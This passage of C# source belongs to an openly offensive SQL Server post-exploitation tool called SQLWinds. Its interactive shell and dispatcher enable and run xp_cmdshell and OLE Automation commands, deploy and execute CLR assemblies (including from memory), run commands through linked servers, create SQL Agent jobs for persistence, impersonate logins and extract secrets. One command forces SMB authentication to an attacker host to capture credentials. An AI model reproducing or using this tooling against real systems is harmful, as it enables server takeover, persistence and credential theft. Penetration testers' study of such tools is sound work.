using Microsoft.Win32.SafeHandles;
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Data;
using System.Data.Sql;
using System.Data.SqlClient;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Linq;
 
using System.Management; 
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
 
using System.Threading.Tasks;
using System.Xml;
namespace SQLWinds
{
    class Program
    {
        static void Main(string[] args)
        {
             
            Task<int> task = MainAsync(args);
            task.Wait();
            Environment.ExitCode = task.Result;
        }
        static async Task<int> MainAsync(string[] args)
        {
            var cfg = CLI.Parse(args);
            if (cfg.ShowHelp) { CLI.PrintHelp(); return 0; }

            
            if (cfg.GetInstance)
            {
                EnumerateDomainInstances();
                return 0;
            }

            
            if (string.IsNullOrEmpty(cfg.Server))
            {
                Console.Error.WriteLine("[-] Missing --server argument.");
                CLI.PrintHelp();
                return 1;
            }
            if (cfg.SpnCheck)
            {
                Console.WriteLine("[*] Performing SPN check for target...");
                try
                {
                    var spns = SpnChecker.FindSpnsForTarget(cfg.ServerHostOnly ?? cfg.Server);
                    SpnChecker.PrintSpnAnalysis(cfg.Server, spns);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] SPN check error: " + ex.Message);
                }
                if (cfg.SpnOnly) return 0;
            }
            var connStr = BuildConnectionString(cfg);
            try
            {
                using (var conn = new SqlConnection(connStr))
                {
                    IDisposable impersonation = null;
                    try
                    {
                        if (cfg.UseKerberos && cfg.HasCredentialPair)
                        {
                            impersonation = Impersonate.IfNeeded(cfg);
                            Console.WriteLine("[*] Impersonation active for provided credentials.");
                        }
                        await conn.OpenAsync();
                        Console.WriteLine($"[+] Connected to {cfg.Server} (DB={conn.Database}).");
                         
                        try
                        {
                            using (var verifyCmd = new SqlCommand("SELECT auth_scheme FROM sys.dm_exec_connections WHERE session_id = @@SPID", conn))
                            {
                                var scheme = await verifyCmd.ExecuteScalarAsync();
                                Console.WriteLine($"[i] Server reports authentication scheme: {scheme ?? "unknown"}");
                            }
                        }
                        catch {   }
                       
                        if (cfg.UseRunas)
                        {
                            if (string.IsNullOrEmpty(cfg.RunasUser) || string.IsNullOrEmpty(cfg.RunasPassword))
                            {
                                Console.WriteLine("[-] Error: --runas requires both username and password");
                                CLI.PrintHelp();
                                return 1;
                            }

                            
                            string server = cfg.Server;
                            bool isLocalhost = IsLocalhostConnection(server);

                            if (isLocalhost)
                            {
                                Console.WriteLine($"[*] Launching as user '{cfg.RunasUser}' for localhost connection");
                                LaunchProcessAsUser(cfg);
                                return 0;  
                            }
                        }

                       

                        if (cfg.EnableOle)
                        {
                            await EnableOleAutomation(conn);
                            return 0;
                        }
                        if (cfg.OleCommand != null)
                        {
                            await RunOleCommand(conn, cfg.OleCommand);
                            return 0;
                        }
                         
                        if (cfg.EnableXpCmdShell)
                        {
                            await TryEnableXpCmdShell(conn);
                            return 0;
                        }
                        if (cfg.DisableXpCmdShell)
                        {
                            await TryDisableXpCmdShell(conn);
                            return 0;
                        }
                        
                        if (cfg.EnableClr)
                        {
                            await EnableClr(conn);
                            return 0;
                        }
                        if (cfg.DisableClr)
                        {
                            await DisableClr(conn);
                            return 0;
                        }
                        if (cfg.ClrAssemblyPath != null)
                        {
                            await DeployClrAssembly(conn, cfg.ClrAssemblyPath);
                            return 0;
                        }
                       
                        if (cfg.ShowInfo)
                        {
                            if (string.IsNullOrEmpty(cfg.Server))
                            {
                                Console.Error.WriteLine("[-] Missing --server argument for info command.");
                                return 1;
                            }

                            
                            try
                            {
                                var infoConnStr = BuildConnectionString(cfg);  
                                using (var infoConn = new SqlConnection(infoConnStr))   
                                {
                                    
                                    var openTask = infoConn.OpenAsync();
                                    if (await Task.WhenAny(openTask, Task.Delay(5000)) == openTask)
                                    {
                                        await openTask;  
                                    }
                                    else
                                    {
                                        throw new Exception("Connection timed out after 5 seconds");
                                    }

                                    if (infoConn.State == ConnectionState.Open)
                                    {
                                        await ExtractServerInfo(infoConn);
                                    }
                                    else
                                    {
                                        throw new Exception("Connection failed to open");
                                    }
                                    return 0;
                                }
                            }
                            catch (SqlException sqlEx) when (sqlEx.Number == 18456)   
                            {
                                Console.WriteLine("[*] Authentication failed, showing public instance info");
                                ShowBasicInstanceInfo(cfg.Server);
                                return 0;
                            }
                            catch (Exception ex)   
                            {
                                Console.WriteLine($"[*] Connection error ({ex.Message}), showing public instance info");
                                ShowBasicInstanceInfo(cfg.Server);
                                return 0;
                            }
                        }
                        if (cfg.RunCommand != null)
                        {
                            var tbl = await ExecuteQueryReturnTable(conn, cfg.RunCommand);
                            PrintTable(tbl);
                            if (!string.IsNullOrEmpty(cfg.ExportCsv)) File.WriteAllText(cfg.ExportCsv, TableToCsv(tbl));
                            if (!string.IsNullOrEmpty(cfg.ExportJson)) File.WriteAllText(cfg.ExportJson, JsonConvert.SerializeObject(tbl, Newtonsoft.Json.Formatting.Indented));
                            return 0;
                        }
                        

                        if (cfg.RunFile != null)
                        {
                            var sql = File.ReadAllText(cfg.RunFile, Encoding.UTF8);
                            await ExecuteScript(conn, sql);
                            return 0;
                        }

                        if (cfg.ListDatabases)
                        {
                            await ListDatabases(conn);
                            return 0;
                        }

                        if (cfg.ListTables)
                        {
                            await ListTables(conn, cfg.TablesDatabase, "dbo", cfg.TablesIncludeSystem);
                            return 0;
                        }

                        if (cfg.ListColumns)
                        {
                            await ListColumns(conn, cfg.ColumnsTable, cfg.ColumnsSchema, cfg.ColumnsDatabase);
                            return 0;
                        }

                        if (cfg.ListUsers)
                        {
                            await ListUsers(conn);
                            return 0;
                        }

                        if (cfg.ListPermissions)
                        {
                            await ListPermissions(conn);
                            return 0;
                        }

                        if (cfg.SecurityAudit)
                        {
                            await SecurityAudit(conn);
                            return 0;
                        }

                        if (cfg.SearchSecrets)
                        {
                            await SearchSensitiveData(conn, cfg.SearchTerm);
                            return 0;
                        }

                        if (cfg.ListSecrets)
                        {
                            await ExtractDatabaseSecrets(conn);
                            return 0;
                        }

                        if (cfg.ListServices)
                        {
                            await ShowServiceAccounts(conn);
                            return 0;
                        }

                        if (cfg.ListLinkedServers)
                        {
                            await ListLinkedServers(conn);
                            return 0;
                        }

                         await REPL(conn, cfg);
                    }
                    finally
                    {
                        impersonation?.Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[-] Fatal: " + ex.Message);
                return 2;
            }
            return 0;
        }
        #region ConnectionString & Builder
        static string BuildConnectionString(Config cfg)
        {
            var builder = new SqlConnectionStringBuilder
            {
                DataSource = cfg.Server,
                InitialCatalog = string.IsNullOrEmpty(cfg.Database) ? "master" : cfg.Database,
                ConnectTimeout = cfg.Timeout,
                Encrypt = cfg.Encrypt,
                TrustServerCertificate = cfg.TrustServerCert
            };
            if (cfg.UseKerberos || cfg.UseIntegrated)
            {
                builder.IntegratedSecurity = true;
            }
            else
            {
                builder.UserID = cfg.User ?? "";
                builder.Password = cfg.Password ?? "";
            }
            return builder.ConnectionString;
        }
        #endregion
        #region REPL & Commands
        static async Task REPL(SqlConnection conn, Config cfg)
        {
            Console.WriteLine("Enter SQL queries. Special commands start with ':'. Type 'exit' to quit.");
            while (true)
            {
                Console.Write("sqlwinds> ");
                var line = Console.ReadLine()?.Trim();
                if (string.IsNullOrEmpty(line)) continue;
                if (line.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;
                if (line.Equals("help", StringComparison.OrdinalIgnoreCase))
                {
                    PrintReplHelp();
                    continue;
                }
               
                if (line.Equals(":plain", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("[*] Entering plain text SQL entry mode. Type ':execute' to run or ':cancel' to abort.");
                    Console.WriteLine("[*] Tip: Paste your SQL script and end with ':execute' on a new line");
                    var sqlLines = new List<string>();

                    while (true)
                    {
                        Console.Write("SQL> ");
                        var sqlLine = Console.ReadLine();

                        
                        if (string.Equals(sqlLine?.Trim(), ":execute", StringComparison.OrdinalIgnoreCase))
                        {
                            break;
                        }
                        else if (string.Equals(sqlLine?.Trim(), ":cancel", StringComparison.OrdinalIgnoreCase))
                        {
                            Console.WriteLine("[*] Plain text entry cancelled");
                            sqlLines.Clear();
                            break;
                        }

                        sqlLines.Add(sqlLine ?? "");
                    }

                    if (sqlLines.Count == 0)
                    {
                        continue;
                    }

                   
                    string fullSql = string.Join("\n", sqlLines);

                    try
                    {
                        Console.WriteLine("[*] Executing SQL script...");
                        var table = await ExecuteQueryReturnTable(conn, fullSql);
                        PrintTable(table);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Query error: " + ex.Message);
                    }

                    continue;
                }
                if (line.StartsWith(":spn", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("[*] Doing SPN check (host part of server)...");
                    var hostOnly = cfg.ServerHostOnly ?? ExtractHostFromDataSource(cfg.Server);
                    var spns = SpnChecker.FindSpnsForTarget(hostOnly);
                    SpnChecker.PrintSpnAnalysis(hostOnly, spns);
                    continue;
                }
                if (line.StartsWith(":enable_xp_cmdshell", StringComparison.OrdinalIgnoreCase))
                {
                    await TryEnableXpCmdShell(conn);
                    continue;
                }

                if (line.StartsWith(":disable_xp_cmdshell", StringComparison.OrdinalIgnoreCase))
                {
                    await TryDisableXpCmdShell(conn);
                    continue;
                }
                if (line.StartsWith(":xp ", StringComparison.OrdinalIgnoreCase))
                {
                    var cmd = line.Substring(4);
                    await ExecXpCmdShell(conn, cmd);
                    continue;
                }
                if (line.StartsWith(":enable_ole", StringComparison.OrdinalIgnoreCase))
                {
                    await EnableOleAutomation(conn);
                    continue;
                }
                if (line.StartsWith(":disable_ole", StringComparison.OrdinalIgnoreCase))
                {
                    await DisableOleAutomation(conn);
                    continue;
                }
                if (line.StartsWith(":ole_cmd ", StringComparison.OrdinalIgnoreCase))
                {
                    var cmd = line.Substring(9);
                    await RunOleCommand(conn, cmd);
                    continue;
                }
                if (line.Equals(":info", StringComparison.OrdinalIgnoreCase))
                {
                    await ExtractServerInfo(conn);
                    continue;
                }
                if (line.StartsWith(":upload ", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Split(new[] { ' ' }, 3);
                    if (parts.Length < 3)
                    {
                        Console.WriteLine("Usage: :upload <localPath> <table>");
                        continue;
                    }
                    await UploadFileToTable(conn, parts[1], parts[2]);
                }
                if (line.StartsWith(":download ", StringComparison.OrdinalIgnoreCase))
                {
                    var match = Regex.Match(line, @":download ""(.+)"" (.+)");
                    if (!match.Success)
                    {
                        Console.WriteLine("Usage: :download \"<SQL>\" <outputFile>");
                        continue;
                    }
                    await DownloadBinary(conn, match.Groups[1].Value, match.Groups[2].Value);
                }
                if (line.StartsWith(":enable_clr", StringComparison.OrdinalIgnoreCase))
                {
                    await EnableClr(conn);
                    continue;
                }
                if (line.StartsWith(":disable_clr", StringComparison.OrdinalIgnoreCase))
                {
                    await DisableClr(conn);
                    continue;
                }
                if (line.StartsWith(":deploy-clr ", StringComparison.OrdinalIgnoreCase))
                {
                    var pathPart = line.Substring(":deploy-clr ".Length).Trim();
                    string assemblyPath;
                    if (pathPart.StartsWith("\"") && pathPart.EndsWith("\""))
                    {
                        assemblyPath = pathPart.Substring(1, pathPart.Length - 2);
                    }
                    else
                    {
                        assemblyPath = pathPart;
                    }
                    await DeployClrAssembly(conn, assemblyPath);
                    continue;
                }
                if (line.StartsWith(":list-assemblies", StringComparison.OrdinalIgnoreCase))
                {
                    await ListAssemblies(conn);
                    continue;
                }
                if (line.StartsWith(":clr_exec ", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Substring(":clr_exec ".Length).Split(new char[] { ' ' }, 4, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length < 3)
                    {
                        Console.WriteLine("Usage: :clr_exec <assembly> <class> <method> [params]");
                        Console.WriteLine("Example: :clr_exec MyAssembly MyNamespace.MyClass MyMethod \"arg1\" \"arg2\"");
                        continue;
                    }
                    string assemblyName = parts[0];
                    string className = parts[1];
                    string methodName = parts[2];
                    string[] methodParams = parts.Length > 3 ?
                        ParseQuotedParameters(parts[3]) :
                        Array.Empty<string>();
                    await ExecClrMethod(conn, assemblyName, className, methodName, methodParams);
                    continue;
                }
                if (line.StartsWith(":remove-assembly ", StringComparison.OrdinalIgnoreCase))
                {
                    var assemblyName = line.Substring(":remove-assembly ".Length).Trim();
                    await RemoveAssembly(conn, assemblyName);
                    continue;
                }
                if (line.StartsWith(":unc_smb ", StringComparison.OrdinalIgnoreCase))
                {
                    var uncPath = line.Substring(":unc_smb ".Length).Trim();
                    await ForceUncSmbAuth(conn, uncPath);
                    continue;
                }
                if (line.StartsWith(":regread ", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Substring(":regread ".Length).Split(new[] { ' ' }, 3);
                    if (parts.Length == 3)
                        await ReadRegistryValue(conn, parts[0], parts[1], parts[2]);
                    continue;
                }

                if (line.StartsWith(":regread_all ", StringComparison.OrdinalIgnoreCase))
                {
                    var args = line.Substring(":regread_all ".Length).Split(new[] { ' ' }, 2);
                    if (args.Length != 2) { /* error */ }
                    await ListRegistryValues(conn, args[0], args[1]);
                }

                if (line.StartsWith(":list_linkservers", StringComparison.OrdinalIgnoreCase))
                {
                    await ListLinkedServers(conn);
                    continue;
                }
                if (line.StartsWith(":ls", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Split(' ');
                    var path = parts.Length > 1 ? string.Join(" ", parts.Skip(1)) : "C:\\";
                    await SqlDirectoryList(conn, path);
                    continue;
                }

                if (line.StartsWith(":linkrpc ", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Substring(":linkrpc ".Length).Split(new[] { ' ' }, 2);
                    if (parts.Length < 2)
                    {
                        Console.WriteLine("Usage: :linkrpc <linked_server> <command>");
                        continue;
                    }
                    await ExecuteViaLinkedServer(conn, parts[0], parts[1]);
                    continue;
                }

                if (line.StartsWith(":agent_job", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length < 2)
                    {
                        Console.WriteLine("Usage: :agent_job [create|list|delete|run] ...");
                        Console.WriteLine("Examples:");
                        Console.WriteLine("  :agent_job create MyJob \"whoami\"");
                        Console.WriteLine("  :agent_job list");
                        Console.WriteLine("  :agent_job delete MyJob");
                        Console.WriteLine("  :agent_job run MyJob");
                        continue;
                    }

                    var subCommand = parts[1].ToLowerInvariant();
                    switch (subCommand)
                    {
                        case "create":
                            if (parts.Length < 4)
                            {
                                Console.WriteLine("Usage: :agent_job create <name> <command>");
                                break;
                            }
                            var jobName = parts[2];
                            var command = string.Join(" ", parts.Skip(3));
                            await CreateAgentJob(conn, jobName, command);
                            break;

                        case "list":
                            await ListAgentJobs(conn);
                            break;

                        case "delete":
                            if (parts.Length < 3)
                            {
                                Console.WriteLine("Usage: :agent_job delete <name>");
                                break;
                            }
                            await DeleteAgentJob(conn, parts[2]);
                            break;

                        case "run":
                            if (parts.Length < 3)
                            {
                                Console.WriteLine("Usage: :agent_job run <name>");
                                break;
                            }
                            await RunAgentJob(conn, parts[2]);
                            break;

                        default:
                            Console.WriteLine($"Unknown sub-command: {subCommand}");
                            break;
                    }
                    continue;
                }
                if (line.StartsWith(":impersonate ", StringComparison.OrdinalIgnoreCase))
                {
                    var login = line.Substring(":impersonate ".Length).Trim();
                    await ImpersonateLogin(conn, login);
                    continue;
                }
                if (line.StartsWith(":revert", StringComparison.OrdinalIgnoreCase))
                {
                    await RevertImpersonation(conn);
                    continue;
                }
                if (line.StartsWith(":memclr ", StringComparison.OrdinalIgnoreCase))
                {
                    string argsLine = line.Substring(":memclr ".Length).Trim();
                    List<string> allParts = new List<string>();
                    bool inQuotes = false;
                    StringBuilder current = new StringBuilder();

                    foreach (char c in argsLine)
                    {
                        if (c == '"')
                        {
                            inQuotes = !inQuotes;
                        }
                        else if (c == ' ' && !inQuotes)
                        {
                            if (current.Length > 0)
                            {
                                allParts.Add(current.ToString());
                                current.Clear();
                            }
                        }
                        else
                        {
                            current.Append(c);
                        }
                    }

                    if (current.Length > 0) allParts.Add(current.ToString());

                    if (allParts.Count < 3)
                    {
                        Console.WriteLine("Usage: :memclr \"<assemblyPath>\" \"<className>\" \"<methodName>\" [param1] [param2] ...");
                        Console.WriteLine("Example: :memclr \"C:\\temp\\MyAssembly.dll\" \"MyNamespace.MyClass\" \"MyMethod\" \"arg1\" \"arg2\"");
                        continue;
                    }

                    string assemblyPath = allParts[0].Trim('"'); 
                    string className = allParts[1].Trim('"');
                    string methodName = allParts[2].Trim('"');
                    string[] methodParams = allParts.Skip(3).Select(p => p.Trim('"')).ToArray();

                    try
                    {
                        
                        if (!File.Exists(assemblyPath))
                        {
                            Console.WriteLine($"[-] Assembly file not found: {assemblyPath}");
                            continue;
                        }

                        byte[] assemblyBytes = File.ReadAllBytes(assemblyPath);
                        await ExecClrFromMemoryBytes(conn, assemblyBytes, className, methodName, methodParams);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Memory CLR execution failed: {ex.Message}");
                    }
                    continue;
                }

                if (line.StartsWith(":exportcsv ", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        
                        var match = System.Text.RegularExpressions.Regex.Match(
                            line,
                            @":exportcsv\s+""([^""]+)""\s+([^\s]+)");

                        if (!match.Success)
                        {
                            Console.WriteLine("Usage: :exportcsv \"<query>\" <outputfile>");
                            Console.WriteLine("Example: :exportcsv \"SELECT name FROM sys.databases\" C:\\output.csv");
                            continue;
                        }

                        var query = match.Groups[1].Value;
                        var outputFile = match.Groups[2].Value;

                        var table = await ExecuteQueryReturnTable(conn, query);
                        File.WriteAllText(outputFile, TableToCsv(table));
                        Console.WriteLine($"[+] Exported {table.Count} rows to {outputFile}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Export failed: {ex.Message}");
                    }
                    continue;
                }

                if (line.StartsWith(":exportjson ", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        
                        var match = System.Text.RegularExpressions.Regex.Match(
                            line,
                            @":exportjson\s+""([^""]+)""\s+([^\s]+)");

                        if (!match.Success)
                        {
                            Console.WriteLine("Usage: :exportjson \"<query>\" <outputfile>");
                            Console.WriteLine("Example: :exportjson \"SELECT name FROM sys.tables\" C:\\output.json");
                            continue;
                        }

                        var query = match.Groups[1].Value;
                        var outputFile = match.Groups[2].Value;

                        var table = await ExecuteQueryReturnTable(conn, query);
                        File.WriteAllText(outputFile, JsonConvert.SerializeObject(table, Newtonsoft.Json.Formatting.Indented));
                        Console.WriteLine($"[+] Exported {table.Count} rows to {outputFile}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Export failed: {ex.Message}");
                    }
                    continue;
                }

                
                if (line.Equals(":dbs", StringComparison.OrdinalIgnoreCase) ||
                    line.Equals(":list-dbs", StringComparison.OrdinalIgnoreCase))
                {
                    await ListDatabases(conn);
                    continue;
                }

                 
                if (line.StartsWith(":columns", StringComparison.OrdinalIgnoreCase))
                {
                    var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length < 2)
                    {
                        Console.WriteLine("Usage: :columns <table> [schema] [database]");
                        Console.WriteLine("Example: :columns spt_monitor dbo master");
                        continue;
                    }

                    string table = parts[1];
                    string schema = parts.Length > 2 ? parts[2] : "dbo";
                    string database = parts.Length > 3 ? parts[3] : null;

                    await ListColumns(conn, table, schema, database);
                    continue;
                }

               
                if (line.Equals(":users", StringComparison.OrdinalIgnoreCase))
                {
                    await ListUsers(conn);
                    continue;
                }

                 
                if (line.Equals(":perms", StringComparison.OrdinalIgnoreCase))
                {
                    await ListPermissions(conn);
                    continue;
                }

                if (line.StartsWith(":tables", StringComparison.OrdinalIgnoreCase))
                {
                    string db = null;
                    string schema = "dbo";
                    bool includeSystem = false;

                    var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length > 1) db = parts[1];
                    if (parts.Length > 2)
                    {
                        if (parts[2].Equals("ALL", StringComparison.OrdinalIgnoreCase))
                            includeSystem = true;
                        else
                            schema = parts[2];
                    }

                    await ListTables(conn, db, schema, includeSystem);
                    continue;
                }
 
                if (line.Equals(":audit", StringComparison.OrdinalIgnoreCase) ||
                    line.Equals(":security-audit", StringComparison.OrdinalIgnoreCase))
                {
                    await SecurityAudit(conn);
                    continue;
                }

               
                if (line.StartsWith(":search", StringComparison.OrdinalIgnoreCase))
                {
                    string searchTerm = "password";
                    var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length > 1) searchTerm = parts[1];

                    await SearchSensitiveData(conn, searchTerm);
                    continue;
                }

                
 
                if (line.Equals(":secrets", StringComparison.OrdinalIgnoreCase))
                {
                    await ExtractDatabaseSecrets(conn);
                    continue;
                }

                 if (line.Equals(":services", StringComparison.OrdinalIgnoreCase))
                {
                    await ShowServiceAccounts(conn);
                    continue;
                }

                if (line.Equals(":sccm_info", StringComparison.OrdinalIgnoreCase) ||
    line.Equals(":sccm_detect", StringComparison.OrdinalIgnoreCase))
                {
                    await DetectAndReportSccm(conn);
                    continue;
                }

                if (line.StartsWith(":sccm_inventory", StringComparison.OrdinalIgnoreCase))
                {
                    await ShowSccmInventory(conn);
                    continue;
                }

                if (line.StartsWith(":sccm_collections", StringComparison.OrdinalIgnoreCase))
                {
                    string filter = line.Substring(":sccm_collections".Length).Trim();
                    await ShowSccmCollections(conn, string.IsNullOrEmpty(filter) ? null : filter);
                    continue;
                }

                if (line.StartsWith(":sccm_deployments", StringComparison.OrdinalIgnoreCase))
                {
                    await ShowSccmDeployments(conn);
                    continue;
                }

                if (line.StartsWith(":sccm_clients", StringComparison.OrdinalIgnoreCase))
                {
                    string filter = line.Substring(":sccm_clients".Length).Trim();
                    await ShowSccmClients(conn, string.IsNullOrEmpty(filter) ? null : filter);
                    continue;
                }

                if (line.StartsWith(":sccm_application", StringComparison.OrdinalIgnoreCase))
                {
                    string appName = line.Substring(":sccm_application".Length).Trim();
                    if (string.IsNullOrEmpty(appName))
                    {
                        Console.WriteLine("[-] Please specify an application name.");
                        Console.WriteLine("Usage: :sccm_application \"Microsoft 365\"");
                    }
                    else
                    {
                        await ShowSccmApplicationDetails(conn, appName);
                    }
                    continue;
                }

                if (line.Equals(":sccm_audit", StringComparison.OrdinalIgnoreCase))
                {
                    await SccmAudit(conn);
                    continue;
                }

                 
                if (!line.EndsWith(";") && !line.StartsWith(":"))
                {
                    var queryLines = new List<string> { line };
                    while (true)
                    {
                        Console.Write(".....> ");
                        var nextLine = Console.ReadLine()?.Trim();
                        if (string.IsNullOrEmpty(nextLine)) continue;
                         
                        if (nextLine.StartsWith(":"))
                        {
                            line = nextLine;
                            break;
                        }
                        queryLines.Add(nextLine);
                        if (nextLine.EndsWith(";")) break;
                    }
                    
                    if (!line.StartsWith(":"))
                    {
                        line = string.Join("\n", queryLines);
                        if (line.EndsWith(";"))
                            line = line.Substring(0, line.Length - 1).Trim();
                    }
                }
               
                if (line.StartsWith(":"))
                {
                    continue;
                }
             
                try
                {
                    var table = await ExecuteQueryReturnTable(conn, line);
                    PrintTable(table);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Query error: " + ex.Message);
                }
            }
        }
        static void PrintReplHelp()
        {
            Console.WriteLine("REPL special commands:");
            Console.WriteLine(":info                        - Show detailed server information");
            Console.WriteLine(":dbs                     - List all databases with details");
            Console.WriteLine(":tables [db] [schema]   - List tables in specified database/schema");
            Console.WriteLine(":columns <table> [schema] - List columns for specified table");
            Console.WriteLine(":users                  - List all SQL logins and database users");
            Console.WriteLine(":perms                  - Show current user permissions");
            Console.WriteLine(":audit                  - Perform security configuration audit");
            Console.WriteLine(":search [term]          - Search for sensitive data (default: password)");
            
            Console.WriteLine(":secrets                - Extract potential secrets from database");
            Console.WriteLine(":services               - Show SQL Server service accounts");
            Console.WriteLine(":spn                         - Check SPNs for the host portion of the --server target");
            Console.WriteLine(":enable_xp_cmdshell          - Enable xp_cmdshell (requires sysadmin)");
            Console.WriteLine(":disable_xp_cmdshell         - Disable xp_cmdshell");
            Console.WriteLine(":xp <command>                - Run xp_cmdshell and show output");
            Console.WriteLine(":enable_ole                  - Enable OLE Automation Procedures (requires sysadmin)");
            Console.WriteLine(":disable_ole                 - Disable OLE Automation Procedures");
            Console.WriteLine(":ole_cmd <command>           - Run OS command using OLE Automation");
            Console.WriteLine(":enable_clr                  - Enable CLR integration (requires sysadmin)");
            Console.WriteLine(":disable_clr                 - Disable CLR integration");
            Console.WriteLine(":deploy-clr <path>           - Deploy CLR assembly");
            Console.WriteLine(":list-assemblies             - List deployed CLR assemblies");
            Console.WriteLine(":clr_exec <assembly> <class> <method> [params] - Execute CLR method");
            Console.WriteLine(":memclr \"<assemblyPath>\" \"<className>\" \"<methodName>\" [params] - Execute CLR assembly from memory");
            Console.WriteLine(":remove-assembly <name>      - Remove a CLR assembly and its procedures");
            Console.WriteLine(":list_linkservers         - List linked servers");
            Console.WriteLine(":linkrpc <srv> <cmd>      - Execute command through linked server");
            Console.WriteLine(":impersonate <login>      - Impersonate a SQL login");
            Console.WriteLine(":revert                   - Revert security context");
            Console.WriteLine(":agent_job create <name> <cmd> - Create persistent agent job");
            Console.WriteLine(":agent_job list           - List SQL agent jobs");
            Console.WriteLine(":agent_job delete <name>  - Delete agent job");
            Console.WriteLine(":agent_job run <name>     - Run agent job");
            Console.WriteLine(":ls [path]              - List directory contents (SQL native)");
            Console.WriteLine(":unc_smb <\\\\attacker_IP> - Force SMB auth to attacker host via UNC path");
            Console.WriteLine(":plain               - Enter plain text SQL entry mode (paste large scripts)");
            Console.WriteLine("                       Paste or type complete SQL scripts");
            Console.WriteLine("                       Type ':execute' to run or ':cancel' to abort");
            Console.WriteLine(":regread <hive> <key> <value> - Read registry value using xp_regread");
            Console.WriteLine(":regread_all <hive> <key> - List all values in registry key");
            Console.WriteLine(":upload <localPath> <table>  - Insert file bytes into table (expects content varbinary(max), filename nvarchar)");
            Console.WriteLine(":download \"<sql>\" <localFile>- Run scalar query returning varbinary and save to file");
            Console.WriteLine(":exportcsv \"<SQL query>\" <path> - Export query results to CSV");
            Console.WriteLine(":exportjson \"<SQL query>\" <path> - Export query results to JSON");
            Console.WriteLine(":sccm_info               - Detect and show SCCM database info");
            Console.WriteLine(":sccm_inventory - Show SCCM hardware/software inventory");
            Console.WriteLine(":sccm_collections [filter] - List SCCM collections");
            Console.WriteLine(":sccm_deployments - Show software deployments");
            Console.WriteLine(":sccm_clients [status] - List SCCM clients");
            Console.WriteLine(":sccm_audit - Perform SCCM security audit");
            Console.WriteLine(":sccm_application <name> - Show details for specific application");
            Console.WriteLine("help, exit");
        }
        #endregion
        #region Query execution helpers
        static async Task ExecuteScript(SqlConnection conn, string sql)
        {
            var parts = sql.Split(new[] { "\rGO\r", "GO", "\rGO", "GO\r" }, StringSplitOptions.RemoveEmptyEntries);
            foreach (var part in parts.Select(p => p.Trim()).Where(p => p.Length > 0))
            {
                using (var cmd = new SqlCommand(part, conn) { CommandTimeout = 120 })
                {
                    var rows = await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine($"[+] Executed part, affected rows: {rows}");
                }
            }
        }
        static async Task<List<Dictionary<string, object>>> ExecuteQueryReturnTable(SqlConnection conn, string sql)
        {
            using (var cmd = new SqlCommand(sql, conn) { CommandTimeout = 120 })
            {
                using (var rdr = await cmd.ExecuteReaderAsync())
                {
                    var result = new List<Dictionary<string, object>>();
                    var cols = Enumerable.Range(0, rdr.FieldCount).Select(rdr.GetName).ToArray();
                    while (await rdr.ReadAsync())
                    {
                        var row = new Dictionary<string, object>();
                        for (int i = 0; i < cols.Length; i++)
                        {
                            row[cols[i]] = rdr.IsDBNull(i) ? null : rdr.GetValue(i);
                        }
                        result.Add(row);
                    }
                    return result;
                }
            }
        }
        static void PrintTable(List<Dictionary<string, object>> table)
        {
            if (table == null || table.Count == 0)
            {
                Console.WriteLine("[i] Empty result set.");
                return;
            }
            var headers = table[0].Keys.ToArray();
            var colWidths = headers.Select(h => Math.Max(h.Length, table.Max(r => r[h]?.ToString()?.Length ?? 4))).ToArray();
 
            for (int i = 0; i < headers.Length; i++)
                Console.Write(headers[i].PadRight(colWidths[i] + 2));
            Console.WriteLine();
            
            for (int i = 0; i < headers.Length; i++)
                Console.Write(new string('-', colWidths[i]) + "  ");
            Console.WriteLine();
          
            int rowCount = 0;
            foreach (var row in table)
            {
                for (int i = 0; i < headers.Length; i++)
                {
                    var val = row[headers[i]];
                    var s = val?.ToString() ?? "NULL";
                    if (s.Length > colWidths[i]) s = s.Substring(0, colWidths[i] - 3) + "...";
                    Console.Write(s.PadRight(colWidths[i] + 2));
                }
                Console.WriteLine();
                if (++rowCount >= 200)
                {
                    Console.WriteLine($"[i] Output truncated after {rowCount} rows.");
                    break;
                }
            }
        }

        static string TableToCsv(List<Dictionary<string, object>> table)
        {
            if (table == null || !table.Any()) return "";

            var headers = table[0].Keys.ToArray();
            var sb = new StringBuilder();

             
            sb.AppendLine(string.Join(",", headers.Select(h => EscapeCsvValue(h))));
 
            foreach (var row in table)
            {
                sb.AppendLine(string.Join(",", headers.Select(h =>
                    EscapeCsvValue(row.ContainsKey(h) ? row[h]?.ToString() : "NULL"))));
            }

            return sb.ToString();
        }

        static string EscapeCsvValue(object value)
        {
            if (value == null) return "\"NULL\"";

            var s = value.ToString();
            if (string.IsNullOrWhiteSpace(s)) return "\"\"";

         
            s = s.Replace("\"", "\"\"");
